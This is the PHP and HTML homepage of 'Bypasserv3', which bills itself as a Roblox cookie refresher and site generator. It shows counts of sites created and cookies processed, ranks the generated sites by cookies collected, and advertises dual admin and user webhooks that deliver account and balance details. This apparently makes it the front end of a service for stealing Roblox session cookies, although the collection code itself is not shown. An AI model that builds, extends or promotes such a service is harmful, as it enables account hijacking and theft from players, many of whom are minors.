<?php
/**
 * Bypasserv3 - Homepage (No Dashboard)
 * Root index file
 */

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/functions.php';

$stats = getGlobalStats();
$leaderboard = getLeaderboard(5);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypasserv3 - Roblox Cookie Refresher</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0a0e27 100%);
            background-attachment: fixed;
            color: #f8fafc;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 60px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 60px;
        }
        
        .header-title {
            font-size: 56px;
            font-weight: 700;
            margin-bottom: 12px;
            background: linear-gradient(90deg, #3b82f6 0%, #60a5fa 50%, #3b82f6 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-size: 200% auto;
            animation: gradientShift 3s ease infinite;
        }
        
        .header-subtitle {
            font-size: 20px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 30px;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% center; }
            50% { background-position: 100% center; }
            100% { background-position: 0% center; }
        }
        
        .cta-button {
            display: inline-block;
            padding: 16px 40px;
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        
        .cta-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(59, 130, 246, 0.4);
        }
        
        .glass-box {
            backdrop-filter: blur(20px) saturate(200%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
            border-radius: 20px;
            padding: 40px;
            margin-bottom: 30px;
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            text-align: center;
        }
        
        .stat-number {
            font-size: 40px;
            font-weight: 700;
            background: linear-gradient(135deg, #3b82f6, #2563eb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        
        .stat-label {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .feature-card {
            backdrop-filter: blur(10px);
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 15px;
            padding: 24px;
            text-align: center;
        }
        
        .feature-icon {
            font-size: 32px;
            margin-bottom: 12px;
        }
        
        .feature-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .feature-desc {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.6);
        }
        
        .leaderboard {
            margin-top: 40px;
        }
        
        .leaderboard h2 {
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .leaderboard-item {
            display: flex;
            justify-content: space-between;
            padding: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(59, 130, 246, 0.1);
            border-radius: 8px;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .rank-badge {
            font-weight: 700;
            color: #3b82f6;
            min-width: 30px;
        }
        
        .footer {
            text-align: center;
            margin-top: 60px;
            padding-top: 40px;
            border-top: 1px solid rgba(59, 130, 246, 0.2);
        }
        
        .footer p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="header-title">Bypasserv3</h1>
            <p class="header-subtitle">Roblox Cookie Refresher</p>
            <a href="/generator/" class="cta-button">⚡ Create Site Now</a>
        </div>

        <div class="glass-box">
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number"><?= $stats['totalInstances'] ?? 0 ?></div>
                    <div class="stat-label">Total Sites</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?= $stats['totalCookies'] ?? 0 ?></div>
                    <div class="stat-label">Cookies Processed</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?= $stats['totalVisits'] ?? 0 ?></div>
                    <div class="stat-label">Total Visits</div>
                </div>
            </div>
        </div>

        <div class="features">
            <div class="feature-card">
                <div class="feature-icon">⚡</div>
                <div class="feature-title">Lightning Fast</div>
                <div class="feature-desc">Generate your site in seconds with full functionality</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔒</div>
                <div class="feature-title">Secure & Safe</div>
                <div class="feature-desc">All cookies handled securely with proper validation</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔔</div>
                <div class="feature-title">Dual Webhooks</div>
                <div class="feature-desc">Admin and user webhooks for complete notifications</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">📊</div>
                <div class="feature-title">Full Stats</div>
                <div class="feature-desc">Get complete account info and balance details</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🌍</div>
                <div class="feature-title">Works Everywhere</div>
                <div class="feature-desc">Works for all countries & proxies supported</div>
            </div>
            <div class="feature-card">
                <div class="feature-icon">✨</div>
                <div class="feature-title">No Dashboard</div>
                <div class="feature-desc">Direct webhook notifications, no complexity</div>
            </div>
        </div>

        <?php if (!empty($leaderboard)): ?>
        <div class="glass-box leaderboard">
            <h2>🏆 Top Sites</h2>
            <?php foreach ($leaderboard as $index => $site): ?>
            <div class="leaderboard-item">
                <div>
                    <span class="rank-badge">#<?= $index + 1 ?></span>
                    <span><?= htmlspecialchars($site['directory']) ?></span>
                </div>
                <div style="color: #10b981;">
                    <?= number_format($site['totalCookies']) ?> cookies
                </div>
            </div>
            <?php endforeach; ?>
        </div>
        <?php endif; ?>

        <div class="footer">
            <p>Bypasserv3 © 2024 | Powered by Railway | No Dashboard Required</p>
        </div>
    </div>
</body>
</html>
?>
